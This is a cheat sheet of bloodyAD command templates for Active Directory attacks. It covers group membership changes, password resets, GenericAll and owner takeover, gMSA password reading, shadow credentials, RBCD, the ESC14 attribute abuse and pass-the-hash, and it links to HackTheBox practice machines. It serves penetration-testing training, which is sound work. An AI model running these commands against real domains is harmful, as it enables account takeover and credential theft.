### Installation
Using uv
```
uv tool install bloodyAD
```
Using pipx
```
pipx install bloodyAD
```
### Retrieve User Information
```
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```
### Add User To Group
```
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```
### Change Password
```
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```
### Give User GenericAll Rights
```
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```
### WriteOwner
```
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```
### ReadGMSAPassword
```
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```
### Enable a Disabled Account
```
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```
### Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
```
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
```
### Modify UPN
```
bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn
```
Check if it has been modified
```
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName
```
### MachineAccountQuota
Enumerate MachineAccountQuota
```
bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
```
Set MachineAccountQuota value to 10
```
bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
```
### Modify mail
```
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local
```
### Modify the altSecurityIdentities attribute (ESC14B)
```
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'
```
### Find Writable Attributes
```
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```
### Shadow Credentials
```
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```
### WriteSPN
```
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```
### Find Deleted Objects
```
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```
### Extended Search Operations
```
bloodyAD --host $dc -d $domain -u $username -p $password get search -h
```
e.g. 
```
-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 to display tombstoned
```
```
bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```
### Restore a deleted object
```
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
``` 
### Create a new computer account
```
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
```
### Add Resource Based Constrained Delegation
```
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```
### Notes
- Pass `-k` to use kerberos authentication
- You can pass a user hash instead of a password using `-p :hash` 
- Specify format for '--password' or '-k <keyfile>' using `-f`, e.g. `-f rc4`
### Resources
- https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
- https://0xdf.gitlab.io/2024/03/30/htb-rebound.html
- https://0xdf.gitlab.io/2025/04/26/htb-vintage.html
- https://www.thehacker.recipes/
### Machines To Practice
- Redelegate (Vulnlab)
- Vintage (HackTheBox)
- Infiltrator (HackTheBox)
- Rebound (HackTheBox)
- Absolute (HackTheBox)
- Certified (HackTheBox)
- TombWatcher (HackTheBox)
- Voleur (HackTheBox)